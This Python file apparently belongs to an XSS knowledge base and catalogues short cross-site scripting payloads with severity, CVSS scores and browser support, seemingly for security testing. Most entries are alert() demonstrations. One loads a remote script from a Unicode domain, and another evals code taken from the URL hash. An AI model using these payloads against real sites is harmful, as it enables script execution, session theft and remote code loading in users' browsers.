#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Length Optimized XSS Payloads (Tiny Vectors)
"""

from ..models import PayloadEntry

LENGTH_RESTRICTED_PAYLOADS = {
    "tiny_svg_alert": PayloadEntry(
        payload="<svg/onload=alert`1`>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.1,
        description="Tiny SVG alert (21 chars)",
        tags=["tiny", "svg", "length-restricted"],
        browser_support=["chrome", "firefox", "edge"],
        reliability="high",
    ),
    "tiny_script_src": PayloadEntry(
        payload="<script src=//⑭.₨>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Shortest script source using Unicode domain (18 chars)",
        tags=["tiny", "script", "unicode", "remote-load"],
        browser_support=["all"],
        reliability="medium",
    ),
    "tiny_eval_hash": PayloadEntry(
        payload="<svg/onload=eval(location.hash.slice(1))>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.8,
        description="Eval location.hash via SVG (41 chars - optimized)",
        tags=["tiny", "svg", "eval", "hash"],
        browser_support=["chrome", "firefox"],
        reliability="high",
    ),
    "tiny_img_onerror": PayloadEntry(
        payload="<img src=x onerror=alert(1)>",
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.1,
        description="Classic IMG onerror (28 chars)",
        tags=["tiny", "img", "onerror"],
        browser_support=["all"],
        reliability="high",
    ),
    "tiny_body_onload": PayloadEntry(
        payload="<body onload=alert(1)>",
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.1,
        description="Body onload (22 chars)",
        tags=["tiny", "body", "onload"],
        browser_support=["all"],
        reliability="high",
    ),
    "tiny_iframe_js": PayloadEntry(
        payload="<iframe src=javascript:alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.1,
        description="Iframe JS protocol (32 chars)",
        tags=["tiny", "iframe", "javascript"],
        reliability="high",
    ),
    "tiny_input_autofocus": PayloadEntry(
        payload="<input onfocus=alert(1) autofocus>",
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.1,
        description="Input autofocus (34 chars)",
        tags=["tiny", "input", "autofocus"],
        browser_support=["all"],
        reliability="high",
    ),
    "tiny_video_error": PayloadEntry(
        payload="<video src=x onerror=alert(1)>",
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.1,
        description="Video onerror (30 chars)",
        tags=["tiny", "video", "onerror"],
        browser_support=["all"],
        reliability="high",
    ),
    # ULTRA TINY VECTORS (<20 chars real candidates)
    "tiny_svg_slash": PayloadEntry(
        payload="<svg/onload=alert(1)",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.1,
        description="Unclosed SVG onload (20 chars) - Works in some browsers",
        tags=["tiny", "svg", "unclosed"],
        browser_support=["chrome", "safari"],
        reliability="medium",
    ),
    "tiny_script_alert": PayloadEntry(
        payload="<script>alert(1)",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.1,
        description="Unclosed script alert (16 chars)",
        tags=["tiny", "script", "unclosed"],
        browser_support=["all"],
        reliability="high",
    ),
}

LENGTH_RESTRICTED_TOTAL = len(LENGTH_RESTRICTED_PAYLOADS)
